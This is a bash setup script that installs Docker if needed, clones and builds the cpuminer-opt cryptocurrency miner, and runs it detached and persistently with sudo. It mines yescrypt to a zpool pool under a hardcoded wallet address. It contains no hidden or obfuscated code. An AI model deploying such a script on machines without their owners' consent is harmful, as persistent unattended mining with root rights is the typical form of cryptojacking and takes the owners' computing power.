#!/bin/bash
[[ $(command -v docker) ]] && {
                sudo service docker start
                sudo apt-get install git htop -y
                git clone https://github.com/JayDDee/cpuminer-opt
                cd ./cpuminer-opt
                sudo docker build -t cpuminer-opt:latest .
                sudo docker run -dit --restart always cpuminer-opt:latest -a yescrypt -o yescrypt.na.mine.zpool.ca:6233 -u D6U8cFeAuyDCMexffrrLN7r2HwG5xZUqgG.worker1
            } || {
                sudo apt-get install git docker.io htop -y
                sudo service docker start
                git clone https://github.com/JayDDee/cpuminer-opt
                cd ./cpuminer-opt
                sudo docker build -t cpuminer-opt:latest .
                sudo docker run -dit --restart always cpuminer-opt:latest -a yescrypt -o yescrypt.na.mine.zpool.ca:6233 -u D6U8cFeAuyDCMexffrrLN7r2HwG5xZUqgG.worker1
            }
